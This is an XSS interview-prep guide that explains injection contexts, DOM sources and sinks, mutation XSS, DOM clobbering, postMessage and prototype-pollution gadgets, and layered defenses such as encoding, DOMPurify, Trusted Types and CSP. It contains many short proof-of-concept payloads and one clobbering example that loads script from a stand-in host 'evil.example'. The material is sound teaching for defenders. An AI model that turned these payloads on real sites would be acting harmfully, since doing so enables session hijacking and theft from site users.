# Cross-Site Scripting (XSS)

> XSS is a code-versus-data confusion: attacker-controlled bytes reach a browser parser (HTML, JS, URL, or CSS) in a position where the parser treats them as executable rather than inert text. The bug is never "the input was bad," it is "the output was placed into a context without the encoding or sanitization that context requires." Once script runs it inherits the victim's origin, so the real primitive is "arbitrary code execution in the security context of the target site," which subsumes cookie theft, request forgery, credential capture, and DOM rewriting. Everything else in this document is a consequence of that one fact.

**Interview frequency:** Core

## How it works

The browser builds a page through a pipeline of parsers, and each stage has its own grammar and its own set of "dangerous" characters. The HTML tokenizer decides where tags and attributes begin and end. The JavaScript parser decides where a string literal ends and an expression begins. The URL parser decides what a scheme is. XSS happens when untrusted data crosses one of those grammar boundaries.<sup>[[1]](#ref1)</sup>

A minimal reflected sink on the server:

```
https://insecure-website.com/status?message=All+is+well
<p>Status: All is well.</p>
```

If `message` is copied into the response body with no encoding, `?message=<script>alert(1)</script>` lands between tags and the tokenizer opens a real `<script>` element. The fix is not to reject `<`, it is to emit `&lt;` so the tokenizer sees character data.

A minimal DOM sink on the client:

```js
var search = document.getElementById('search').value;
document.getElementById('results').innerHTML = 'You searched for: ' + search;
```

`innerHTML` invokes the HTML fragment parser on a string that includes attacker input. The server may never see the payload at all, which is the defining property of DOM XSS: the taint flows from a client-side source to a client-side sink entirely in the browser.

The mental model that scores in interviews: name the **source** (where untrusted data enters), name the **sink** (the API that interprets it), and name the **context** (the grammar the sink parses). Fix the pair, not the string.

### The four varieties

- **Reflected**: payload is in the current request (query string, path, header) and echoed into the immediate response.<sup>[[2]](#ref2)</sup> Requires luring the victim to a crafted URL or auto-submitting form. One request, one victim, no persistence.
- **Stored (persistent, second-order)**: payload is saved server-side (comment, display name, filename, support ticket, SMTP message, log line) and served to every later viewer. No lure needed, highest blast radius, can be wormable.
- **DOM-based**: the taint flow is client-side only.<sup>[[3]](#ref3)</sup> Server-side filters and WAFs are blind to it because the payload can live in `location.hash` (never sent to the server) or in `document.cookie`, `postMessage`, `localStorage`, `window.name`, or `document.referrer`.
- **Blind**: a stored XSS whose sink you cannot observe (an internal admin dashboard, a SOC log viewer, a CRM ticket screen). You confirm it with an out-of-band callback (a loaded `img`/`fetch` to a server you control, for example with a Burp Collaborator or XSS Hunter style payload) that fires when a privileged user renders your input.

```mermaid
flowchart TD
  subgraph Reflected
    R1[Attacker crafts link, payload in query param] --> R2[Victim clicks link]
    R2 --> R3[Browser sends GET to vulnerable site]
    R3 --> R4[Site reflects unescaped payload in HTML response]
    R4 --> R5[Browser executes payload in site's origin]
  end

  subgraph Stored
    S1[Attacker submits payload once] --> S2[Payload persisted server-side]
    S2 -. later .-> S3[Any victim loads the page normally]
    S3 --> S4[Second, unrelated request reads stored payload]
    S4 --> S5[Server renders payload into HTML response]
    S5 --> S6[Browser executes payload in site's origin]
  end

  subgraph DOMBased["DOM-based"]
    D1[Victim clicks link, payload in URL fragment] --> D2[Browser loads page normally, server never sees the fragment]
    D2 --> D3[Client-side JS reads location.hash]
    D3 --> D4[JS writes value into innerHTML, an unsanitized sink]
    D4 --> D5[Payload executes purely client-side]
  end

  classDef atk fill:#fee,stroke:#900
  class R1,S1,D1 atk
```



### Sources and sinks (DOM XSS)

Common **sources** (attacker-influenced): `location` and its parts (`location.href`, `location.search`, `location.hash`, `location.pathname`), `document.URL`, `document.referrer`, `window.name`, `document.cookie`, `postMessage` event `data`, `localStorage`/`sessionStorage`, and reflected/stored values the server injected into a JS variable.<sup>[[3]](#ref3)</sup>

Common HTML **sinks** (parse a string as markup): `element.innerHTML`, `element.outerHTML`, `element.insertAdjacentHTML`, `document.write`, `document.writeln`, `iframe.srcdoc`, `Range.createContextualFragment`, and jQuery methods `html()`, `append()`, `prepend()`, `before()`, `after()`, `wrap()`, plus the `$()` selector and `$.parseHTML()`.

Common JavaScript-execution **sinks**: `eval`, `Function()`, `setTimeout`/`setInterval`/`setImmediate` when passed a string, `location`/`location.href`/`location.assign`/`location.replace` (allows the `javascript:` scheme), `script.src`, `script.text`, `a.href`, and `element.setAttribute` on an event-handler or URL attribute.

**Framework escape hatches** are sinks in disguise, and every one deserves a line in a code review:

- React `dangerouslySetInnerHTML={{__html: userInput}}`, plus `href={userInput}` allowing `javascript:` (React does not sanitize URL schemes) and `ref` callbacks that touch the raw DOM.
- Angular `bypassSecurityTrustHtml` / `bypassSecurityTrustUrl` / `bypassSecurityTrustScript` / `bypassSecurityTrustResourceUrl` (they switch off Angular's built-in sanitizer), and legacy AngularJS template interpolation `{{ }}` under `ng-app`.
- Vue `v-html`.
- Svelte `{@html userInput}`.
- Lit `unsafeHTML()`; Polymer `inner-h-t-m-l`.

### Why context decides everything

The same string is safe in one context and lethal in the next, because each parser decodes differently.<sup>[[4]](#ref4)</sup> HTML-encoding a value that lands in a `<script>` block does nothing, because the JS parser never HTML-decodes. This is the single most common false-safety bug: one encoder applied to all outputs.

## Quick reference

```
# Event-handler payload: fires without a <script> tag, survives innerHTML sinks that strip <script>

# The broken image src makes onerror fire immediately; onerror is parsed as a real
# event-handler attribute, so the JS runs in the page's own origin with no <script> element needed.
```

| Invariant | Where enforced | How violated | Source |
|---|---|---|---|
| Output is encoded for the specific grammar it lands in (HTML/JS/URL/CSS), never one encoder reused across contexts | Template/output layer, contextual encoding | HTML-encoding a value that lands inside a `<script>` block or a `javascript:` URL does nothing, because that parser never HTML-decodes | <sup>[[4]](#ref4)</sup> |
| Framework auto-escaping is bypassed only through an explicit, reviewed escape hatch, never silently | Framework template compiler plus lint/Semgrep rule on the escape hatch | `dangerouslySetInnerHTML`, `v-html`, `bypassSecurityTrustHtml`, or `href={userInput}` used without a security sign-off | <sup>[[11]](#ref11)</sup> |
| HTML sanitization runs through a parser-aware library and the sanitized string is never mutated afterward | Sanitization library at the render boundary (DOMPurify) | Mutation XSS: `innerHTML` re-serializes and re-parses the DOM, healing a sanitizer-approved string into executable markup | <sup>[[6]](#ref6)</sup> |
| Elements a sanitizer accepts must not carry `id`/`name` values that shadow `document`/`window` globals | Sanitizer configuration (DOMPurify `SANITIZE_NAMED_PROPS`) | DOM Clobbering: `<a id="x">` or a clobbered `<form>` redirects a trusted global lookup to attacker-controlled markup | <sup>[[7]](#ref7)</sup> |
| A `postMessage` handler verifies `event.origin` by strict equality against an allowlist before trusting `event.data` | Message-event handler code | Missing or weak origin checks (substring match, `event.source` alone, unanchored regex) let any framing page inject data into an HTML sink | <sup>[[9]](#ref9)</sup> |
| CSP `script-src` uses nonces/`strict-dynamic` with no `unsafe-inline`/`unsafe-eval` and no policy-reflecting endpoint | `Content-Security-Policy` header configuration | Self-defeating directives or a reflected `report-uri` parameter let an attacker inject additional directives into the live policy | <sup>[[19]](#ref19)</sup> |

## Attack techniques

### 1. HTML body context (inject a new element)

Data lands between tags: `<div>DATA</div>`. Inject a tag that runs script. Modern browsers do not execute `<script>` inserted via `innerHTML`, and `svg onload` does not fire through `innerHTML`, so the reliable primitives are elements with event handlers:

```html

<svg onload=alert(document.domain)>
<iframe src="javascript:alert(document.domain)">
```

Why it works: the tokenizer opens a real element; `onerror`/`onload` are parsed as event-handler content attributes and the JS runs when the load fails or completes. Detection: reflect a unique marker like `zqx123`, then `zqx123<u>` and confirm the `<u>` renders as a real element in the live DOM (DevTools, not "View Source").

Note on PoC choice: since Chrome 92 (July 2021) cross-origin iframes cannot call `alert()`, so PortSwigger labs and many real reports use `print()` as the marker instead.

### 2. HTML attribute context (break out or add a handler)

Data lands inside an attribute value: `<input value="DATA">`. Quoted attribute: close the quote and add a handler:

```html
"><script>alert(1)</script>
" autofocus onfocus=alert(1) x="
```

Unquoted attribute (`<input value=DATA>`) needs only whitespace to add a new attribute, no quote required:

```html
x onmouseover=alert(1)
```

Some attributes are dangerous even without breaking out. In an `href`/`src`, a `javascript:` value executes on click/load; in a legacy `style` attribute, `expression()` ran on old IE. Detection: inject a `"` and a `'` and observe whether either survives unencoded into the attribute.

### 3. JavaScript string context (break the string, or the script element)

Data lands inside a quoted JS string: `<script>var x = 'DATA';</script>`. Three distinct breakouts:

Break the string literal, then run code and comment out the tail:

```js
'; alert(1); //
```

Break the whole script element (the HTML tokenizer wins over the JS parser, so a literal `</script>` closes the block even mid-string):

```html
</script><script>alert(1)</script>
```

Abuse HTML-decoding of event-handler attributes: inside an inline handler the browser HTML-decodes the attribute before handing it to the JS parser, so entities become live syntax:

```html
<a href="#" onclick="var x='&#39;;alert(1)//'">click</a>
```

**Template literal context** is special: if the data lands inside backticks, you do not even need to break out of the string, because `${...}` is evaluated:

```js
`Hello ${alert(document.domain)}`
```

Detection: this is the context where you must trace with the JS debugger, because a value routed through `eval('var data="REFLECTED"')` may never appear in the DOM tree at all.

### 4. URL context (the javascript: scheme)

Data becomes a URL used by `href`, `src`, `location`, `window.open`, or an `<iframe>`:

```
javascript:alert(document.domain)
```

A classic DOM instance via jQuery `attr()`:

```js
$('#backLink').attr('href', new URLSearchParams(location.search).get('returnUrl'));
```

```
?returnUrl=javascript:alert(document.domain)
```

Why it works: the anchor's `href` is set to a `javascript:` URL and clicking navigates to it, running the script. Defense here is scheme allowlisting (`http`/`https`/`mailto` only), not encoding, because the value is a syntactically valid URL.

### 5. CSS context

Data lands in a style value. Legacy `expression()` (old IE) ran JS; modern impact is data exfiltration via `url()` and attribute-selector-driven leaks (CSS injection reading tokens character by character). Rarely direct script execution today but still an injection to close off.

### 6. Mutation XSS (mXSS)

The HTML fragment parser is not a pure function: reading `element.innerHTML` **re-serializes** the DOM, and re-parsing that serialization can "heal" or transform markup into something that executes, even after a sanitizer approved the intermediate string. The canonical academic reference is Heiderich, Schwenk, Frosch, Magazinius, and Wang, "mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations" (ACM CCS 2013).<sup>[[5]](#ref5)</sup>

The mechanics that produce mutations:

- **Foreign content** (`<svg>`, `<math>`): inside these subtrees the parser uses a different content model, so an element that was inert as text becomes an HTML integration point on re-parse. Michał Bentkowski's DOMPurify bypasses used nested `<form>`, `<math>`, and `<svg>` to smuggle payloads through a round-trip.
- **Attribute and tag normalization**: the serializer can drop or move quotes and namespaces, turning `<a ">` style constructs into working markup after a second parse.
- **noscript, template, and CDATA quirks**: parsing rules differ depending on whether scripting is enabled, so the same string yields different trees.

Realistic sanitizer-bypass shape (structure, not a working 0-day):

```html
<svg></p><style><a id="</style>">
```

Why mXSS matters in interviews: it is the reason you must never hand-roll a regex sanitizer and must never sanitize-then-mutate. Sanitize with a library that models the parser (DOMPurify)<sup>[[6]](#ref6)</sup> and do not touch the string afterward, because any later `innerHTML` round-trip can re-introduce the vulnerability.

### 7. Framework and library gadgets

- jQuery `CVE-2020-11022` and `CVE-2020-11023`: passing HTML from an untrusted source to jQuery DOM-manipulation methods could execute code even after some sanitization, due to `htmlPrefilter` regex mutation (fixed in 3.5.0). `CVE-2015-9251`: jQuery cross-domain AJAX with no `dataType` could execute a `text/javascript` response.
- jQuery `$(location.hash)` selector: historically a DOM XSS staple. Newer jQuery blocks selectors starting with `#`, but the `$()` sink is still exploitable when you fully control input from a source that does not require a `#` prefix. Triggering `hashchange` without user interaction:

```html
<iframe src="https://vulnerable-website.com#" onload="this.src+=''">
```

- AngularJS (`ng-app` present): `{{constructor.constructor('alert(1)')()}}` style client-side template injection executes without angle brackets or event handlers, and sandbox escapes (documented by Gareth Heyes, Mario Heiderich, and Jann Horn) removed the old 1.x sandbox entirely.

### 8. Turning self-XSS into real impact

Self-XSS (you can only run script in your own session, for example pasting into a field only you see) is not a vulnerability by itself. The interview point is that self-XSS is a *delivery* problem, and delivery is solvable:

- **Chain with CSRF**: if the action that stores the payload lacks CSRF protection, forge a cross-site request that plants your payload into the *victim's* profile. It is now stored XSS firing in their session.
- **Login CSRF / forced login**: force the victim into an attacker-controlled account that already contains the self-XSS payload, so the script runs and captures whatever the victim then types or does.
- **Re-test as reflected/DOM**: if the "self" field is actually reachable through a URL, `postMessage`, or hash you can send, it was never self-XSS.

### 9. What you do after code executes

Because script runs in the victim's origin, the impact is not "steal the cookie," it is "become the user's browser":

- Read the CSRF token from the page and then submit the state-changing request yourself: XSS *defeats* CSRF tokens, because same-origin script can read them.
- `HttpOnly` blocks `document.cookie` reading but does **not** stop authenticated requests: `fetch('/admin/deleteUser', {method:'POST', credentials:'include'})` runs with the victim's cookies regardless.
- Exfiltrate non-`HttpOnly` cookies, capture keystrokes and credentials, rewrite the DOM for phishing, pivot to internal same-origin endpoints, hook the browser (BeEF), and self-propagate through stored contexts (the Samy worm, MySpace, October 2005, by Samy Kamkar added over a million friends in under a day using stored XSS that re-posted itself).

### 10. DOM Clobbering

DOM Clobbering turns HTML-only injection (no `<script>`, no event handlers, no `javascript:` URL) into script execution by exploiting a browser rule most developers do not think about: named `id` and `name` attributes on HTML elements automatically create properties on `document` and `window`. A sanitizer that strips scripts and event handlers but permits `<a>`, `<form>`, `<input>`, ``, and their `id`/`name` attributes leaves the class wide open.

The primitive: `<a id="x">` makes `document.x` reference that element, and `window.x` follows. A form clobber like `<form id="config"><input name="url" value="//evil.example/xss.js">` makes `config.url` resolve to an HTMLInputElement whose `.value` the attacker controls. Any JS that later reads a global or a config lookup, treats a "trusted" object property as safe, or uses `document.currentScript`-style patterns, can be redirected. A concrete exploit shape: an app that lazy-loads a plugin via `var s = document.createElement('script'); s.src = config.pluginUrl; document.head.appendChild(s);` where `config` is a global will fetch attacker-controlled JS after an injected form clobbers `config`.

Chains include hijacking script `src` in `document.currentScript`-style patterns, defeating allowlist checks that read `window.someObj`, and bypassing "is this URL safe" helpers that walk a property path. Gareth Heyes documented the class in depth<sup>[[7]](#ref7)</sup> and DOMPurify added `SANITIZE_DOM` and `SANITIZE_NAMED_PROPS` options to reject IDs and names that collide with built-ins or with existing globals.<sup>[[6]](#ref6)</sup>

The interview point is that a sanitizer that allows `id`/`name` is not sufficient. Read configuration from a closure-scoped object rather than a global that HTML can shadow, prefer `Object.create(null)` bags over `window` properties, and turn on `SANITIZE_NAMED_PROPS` when you must accept authored HTML.

### 11. Stored XSS via user-uploaded files (SVG and friends)

Stored XSS is not only text fields. Any file the application accepts and later serves from its own origin is a potential sink, and SVG is the canonical example because SVG is XML that may contain `<script>` or event-handler attributes. When an uploaded SVG is served with `Content-Type: image/svg+xml` and the victim navigates directly to `https://app.example/uploads/logo.svg`, the browser parses it as an XML document, opens the script element, and runs it in the app's origin with the app's cookies.

The same class covers uploaded HTML and XHTML files, PDFs served inline (some PDF viewers run JS), and, on browsers that sniff, `text/plain` or `application/octet-stream` responses whose bodies begin with `<html>` or `<script>`. Note that `` does not execute the script (image context suppresses scripting), but a direct navigation, an `<object>`, or an `<iframe>` embed does.

Defenses stack.<sup>[[8]](#ref8)</sup> Serve user-uploaded content from a separate sandbox origin (`usercontent.example.com` distinct from `app.example`) so any script that fires runs in an origin with no cookies and no access to the main app. Force `Content-Disposition: attachment` for arbitrary uploads so the browser downloads rather than renders. Strip scripts and event handlers from SVG with DOMPurify's SVG profile<sup>[[6]](#ref6)</sup> before storage. Send `X-Content-Type-Options: nosniff` and a precise `Content-Type`. Never let user uploads inherit a path under the main app origin.

### 12. postMessage handlers without strict origin checks

`postMessage` is a DOM XSS source that is easy to get wrong because the platform gives you `event.origin` but does not force you to check it.<sup>[[9]](#ref9)</sup> A handler like this is exploitable by any page that can open or iframe the target:

```js
window.addEventListener('message', e => {
  document.body.innerHTML = e.data;
});
```

The attacker page opens a popup or iframe of the victim and calls `victim.postMessage('', '*')`. No origin check ran, so the payload lands in `innerHTML`. Common wrong fixes make the bug look fixed while leaving it open: checking `event.source` alone (the attacker controls the frame reference used for the check), `origin.indexOf('trusted.com') !== -1` (matches `trusted.com.evil.com` and `evil.com/?x=trusted.com`), or a regex without `^` and `$` anchors.

The correct pattern is strict equality against a small allowlist of origin strings, treat `e.data` as untrusted even from a trusted origin (postMessage relays and open framing paths let attacker data ride on a trusted sender), never route `e.data` into an HTML or script sink, and prefer a structured schema (JSON with a fixed shape and a version field) over free-form strings. When you ship a legitimate postMessage API, publish the target origins and the message schema alongside the handler.

### 13. Prototype pollution as an XSS gadget

Client-side prototype pollution is a separate class of bug (an unsafe merge, clone, or query-string-to-object utility writes attacker keys onto `Object.prototype`), but it becomes an XSS primitive when a downstream library reads its own configuration through property lookups that fall through to the prototype. The attacker never touches the sanitizer directly, only the sanitizer's config.

Documented gadgets include DOMPurify's `ALLOWED_ATTR`/`ALLOWED_TAGS` being widened through prototype<sup>[[6]](#ref6)</sup> (so an event-handler attribute the app never intended to allow gets through), jQuery's `$.extend`-driven option handling picking up prototype-polluted defaults, and template engines that consult `Object.prototype` for helper lookups or partials paths.<sup>[[10]](#ref10)</sup> A single polluted key can turn a sanitizer from a defense into a passthrough.

Defenses are layered. Use `Object.create(null)` for config bags so there is no prototype to pollute in the first place. Freeze prototypes early (`Object.freeze(Object.prototype)` where library compatibility permits). Validate that merge/clone utilities reject `__proto__`, `constructor`, and `prototype` keys, or replace them with `structuredClone`. Keep client libraries patched, because new sink gadgets are still being found. The interview point is that "we sanitize HTML" is not sufficient when the sanitizer's own configuration is attacker-influenced through a separate class of bug.

## Defense

### Real fix

1. **Contextual output encoding at the point of output.**<sup>[[11]](#ref11)</sup> Encode for the *specific* grammar the data lands in: HTML entity encoding in body/attribute contexts (`& < > " '`), JavaScript `\uXXXX` Unicode escaping inside JS string literals, URL percent-encoding for URL parameters, CSS hex escaping in style values. Never reuse one encoder across contexts. There are "dangerous contexts" where encoding cannot save you (directly inside `<script>`, inside HTML comments, in a tag/attribute name, in `javascript:` URLs): do not put untrusted data there at all.

2. **Let the framework auto-escape, and treat every escape hatch as a review gate.** React, Angular, and modern template engines auto-escape interpolated values, which eliminates most XSS by default. The residual risk is entirely in `dangerouslySetInnerHTML`, `v-html`, `bypassSecurityTrust*`, `{@html}`, raw `innerHTML`, and `href={userInput}` with a `javascript:` scheme. Ban these with lint/Semgrep rules and require a security sign-off on each use.

3. **Sanitize HTML you genuinely must render** (WYSIWYG output) with a vetted, mutation-aware library: **DOMPurify** (`DOMPurify.sanitize(dirty)`). Never a hand-rolled blocklist or regex. Allowlist tags and attributes, keep the library patched (browser parser changes create new bypasses), and never mutate the string after sanitizing.

4. **Prefer safe sinks.**<sup>[[12]](#ref12)</sup> Use `textContent` over `innerHTML`, `setAttribute` with a hardcoded safe name, `element.className`, `formfield.value`, `document.createTextNode`, and `window.encodeURIComponent` for URL construction. Do not pass strings to `eval`/`Function`/`setTimeout`.

5. **Trusted Types**<sup>[[13]](#ref13)</sup> (Chromium) to eliminate DOM XSS as a class: `Content-Security-Policy: require-trusted-types-for 'script'`. DOM sinks (`innerHTML`, `outerHTML`, `document.write`, `script.src`) then reject plain strings and only accept values minted by a vetted policy, converting DOM XSS into an enforced, testable error instead of a runtime exploit. Ship a default policy that routes legacy paths through DOMPurify.

### Defense in depth

1. **Strict Content Security Policy**<sup>[[14]](#ref14)</sup> as the last line of defense, not a substitute for encoding. A holding configuration is nonce- or hash-based with `strict-dynamic`, no `unsafe-inline`, no `unsafe-eval`, `object-src 'none'`, and `base-uri 'none'`:

```
Content-Security-Policy: script-src 'nonce-r4nd0m' 'strict-dynamic'; object-src 'none'; base-uri 'none'
```

   CSP reduces the impact of an XSS that already exists; it does not fix the bug. The Google study "CSP Is Dead, Long Live CSP" (Weichselbaum, Spagnuolo, Lekies, Janc, ACM CCS 2016) found the overwhelming majority of real-world policies trivially bypassable.<sup>[[15]](#ref15)</sup> The reasoning an expert gives:

   - **Self-defeating directives**: `unsafe-inline`, `unsafe-eval`, `data:` in `script-src`, or a broad `*`/`https:` source largely nullify the policy.
   - **Allowlisted-host gadgets**: if the policy allows a host you can place content on (a CDN without per-customer paths like `ajax.googleapis.com`, an open JSONP endpoint, or a hosted copy of AngularJS), you load or bootstrap your script from that trusted origin. `strict-dynamic` exists precisely to abandon host allowlists in favor of nonce propagation.
   - **Missing `base-uri`**: inject `<base href>` to hijack relative script URLs. **`object-src` not `none`**: plugin/embed vectors.
   - **Nonce mistakes**: reused, static, or guessable nonces, or DOM injection *before* a legitimately nonced script so the browser reuses that nonce.
   - **Policy injection**: if the app reflects input into the policy (often a `report-uri`), inject a `;` to add directives; Gareth Heyes' PortSwigger research used the newer `script-src-elem` directive to overwrite an existing `script-src`.<sup>[[16]](#ref16)</sup>

2. **Cookie hardening and validated input** as supporting layers: `HttpOnly` (limits cookie theft, not request forgery), `Secure`, `SameSite`, plus allowlist input validation where the format is known. Neither is sufficient alone. Per OWASP, a WAF is not an XSS control (it misses DOM XSS entirely and is routinely bypassed).<sup>[[11]](#ref11)</sup>

3. **`X-Content-Type-Options: nosniff` on every response, precise `Content-Type` on every endpoint.**<sup>[[17]](#ref17)</sup> The invariant enforced is that a response body is interpreted only as the type the server declared. Without `nosniff`, browsers historically inspected response bodies and could treat a `text/plain` or `application/octet-stream` response beginning with `<html>` or `<script>` as HTML or JavaScript, turning any endpoint that reflects user bytes (error pages, JSON endpoints served without a JSON content type, uploaded files) into an XSS sink. Why it works: MIME sniffing is the browser's fallback when it does not trust the server's type; declaring the type authoritatively and forbidding sniffing removes the fallback. A common wrong implementation is setting `nosniff` on HTML responses only. It has to be on every response, including uploads, JSON APIs, and static file handlers, and `nosniff` also blocks script and style responses served without the matching type from executing, which shuts down JSONP-adjacent gadgets.

4. **Sandboxed iframes for rendering untrusted HTML.**<sup>[[18]](#ref18)</sup> The invariant enforced is that a sanitizer bypass cannot reach the app's origin. Render user-supplied HTML inside `<iframe sandbox srcdoc="...">` and omit `allow-same-origin` so scripts, forms, popups, and same-origin DOM access are disabled by default, or serve the content from a separate sandbox domain (`usercontent.example.com`) so any script that escapes sanitization runs in an origin with no cookies and no access to the app's DOM. Why it works: the browser enforces the sandbox at the origin boundary, and origin-level isolation survives the class of parser bugs that break sanitizers. This is how GitHub renders README HTML and how Google Docs isolates embedded content. A common wrong implementation is `sandbox` with `allow-same-origin allow-scripts` together, which the spec explicitly warns removes the sandbox's protection because the framed page can call out to remove the sandbox attribute from its parent. It is the structural answer to "a sanitizer bypass is one commit away, what else do you have."

## Interviewer probes

Mid: "If we validate input strictly on the way in, doesn't that stop XSS?"

Principal: No. Input validation is defense-in-depth, not the fix. Contextual output encoding is the fix, because plenty of legitimate values legitimately contain `<` or `"` (a math forum, a code snippet field, an address with an ampersand), so you can't reject your way to safety without breaking real input. The bug is that the output was placed into a parser context without the encoding that context requires; validation on the way in doesn't touch that.

Mid: "The session cookie is HttpOnly, so we're protected against XSS, right?"

Principal: HttpOnly stops `document.cookie` reads, nothing else. The attacker's script still executes in the page and can call `fetch('/admin/deleteUser', {credentials: 'include'})`, which rides on the cookie automatically without ever reading it. Once script runs in the origin, the attacker has the user's full authenticated capability, cookie theft is just one of many things they could do with it.

Mid: "We use React, so we're not exposed to XSS, correct?"

Principal: Only until someone reaches for `dangerouslySetInnerHTML`, puts unvalidated input into an `href` (React does not sanitize the `javascript:` scheme), or touches the raw DOM through a `ref` callback. Every framework's auto-escaping covers the common path and leaves the escape hatches uncovered, which is exactly why those hatches need a lint rule and a security sign-off rather than an assumption of safety.

Mid: "We HTML-encode all user input before rendering it, so we should be covered everywhere it appears?"

Principal: Encoding the same way everywhere is itself the bug. HTML-encoding a value that lands inside a `<script>` block or inside a `javascript:` URL does nothing, because the JS parser never HTML-decodes and the URL parser doesn't either. The fix has to be context-specific: HTML entity encoding in body/attribute contexts, JS `\uXXXX` escaping in script string literals, URL percent-encoding in URL parameters. One encoder applied everywhere is the most common false-safety bug in this space.

Mid: "We found a self-XSS where a user can only inject script into their own session, so it's not really exploitable, right?"

Principal: Self-XSS is a delivery problem, not a severity ceiling. If the action that stores the payload lacks CSRF protection, the attacker forges a request that plants their payload into the victim's account, turning it into stored XSS firing in someone else's session. Login CSRF does the same thing by force-logging the victim into an attacker-controlled account that already holds the payload. Rate the finding by what it becomes once delivery is solved, not by today's delivery constraint.

Mid: "We have a WAF in front of the app, does that cover our XSS risk?"

Principal: Not for DOM-based XSS, which the WAF never sees, because the payload can live entirely client-side in `location.hash` and never touch the network. Server-reflected and stored XSS payloads sent through a WAF are also routinely evaded through the same kind of context confusion that defeats blocklists everywhere else. A WAF is a speed bump for unsophisticated scanners, not a control you can rely on for this class.

## Sources

<a id="ref1"></a>[1] PortSwigger Web Security Academy, "Cross-site scripting". Retrieved 2026. https://portswigger.net/web-security/cross-site-scripting

<a id="ref2"></a>[2] PortSwigger, "Reflected XSS". Retrieved 2026. https://portswigger.net/web-security/cross-site-scripting/reflected

<a id="ref3"></a>[3] PortSwigger, "DOM-based XSS". Retrieved 2026. https://portswigger.net/web-security/cross-site-scripting/dom-based

<a id="ref4"></a>[4] PortSwigger, "XSS cheat sheet" (contexts and payloads). Retrieved 2026. https://portswigger.net/web-security/cross-site-scripting/cheat-sheet

<a id="ref5"></a>[5] Heiderich, Schwenk, Frosch, Magazinius, Wang, "mXSS Attacks: Attacking well-secured Web-Applications by using innerHTML Mutations". ACM CCS 2013. https://cure53.de/fp170.pdf

<a id="ref6"></a>[6] DOMPurify (cure53). GitHub. Retrieved 2026. https://github.com/cure53/DOMPurify

<a id="ref7"></a>[7] PortSwigger Research, "DOM Clobbering strikes back" (Gareth Heyes). Retrieved 2026. https://portswigger.net/research/dom-clobbering-strikes-back

<a id="ref8"></a>[8] OWASP, "File Upload Cheat Sheet". Retrieved 2026. https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html

<a id="ref9"></a>[9] MDN, "Window: postMessage() method". Retrieved 2026. https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage

<a id="ref10"></a>[10] "Client-Side Prototype Pollution" (BlackFan gadgets list). GitHub. Retrieved 2026. https://github.com/BlackFan/client-side-prototype-pollution

<a id="ref11"></a>[11] OWASP, "Cross Site Scripting Prevention Cheat Sheet". Retrieved 2026. https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html

<a id="ref12"></a>[12] OWASP, "DOM based XSS Prevention Cheat Sheet". Retrieved 2026. https://cheatsheetseries.owasp.org/cheatsheets/DOM_based_XSS_Prevention_Cheat_Sheet.html

<a id="ref13"></a>[13] Google, "Trusted Types". web.dev. Retrieved 2026. https://web.dev/articles/trusted-types

<a id="ref14"></a>[14] PortSwigger, "Content security policy". Retrieved 2026. https://portswigger.net/web-security/cross-site-scripting/content-security-policy

<a id="ref15"></a>[15] Weichselbaum, Spagnuolo, Lekies, Janc, "CSP Is Dead, Long Live CSP!". Google, ACM CCS 2016. https://research.google/pubs/pub45542/

<a id="ref16"></a>[16] PortSwigger Research, "Bypassing CSP with policy injection" (Gareth Heyes). Retrieved 2026. https://portswigger.net/research/bypassing-csp-with-policy-injection

<a id="ref17"></a>[17] MDN, "X-Content-Type-Options". Retrieved 2026. https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Content-Type-Options

<a id="ref18"></a>[18] MDN, "iframe: sandbox attribute". Retrieved 2026. https://developer.mozilla.org/en-US/docs/Web/HTML/Element/iframe#sandbox

<a id="ref19"></a>[19] Google, "CSP Evaluator". Retrieved 2026. https://csp-evaluator.withgoogle.com/
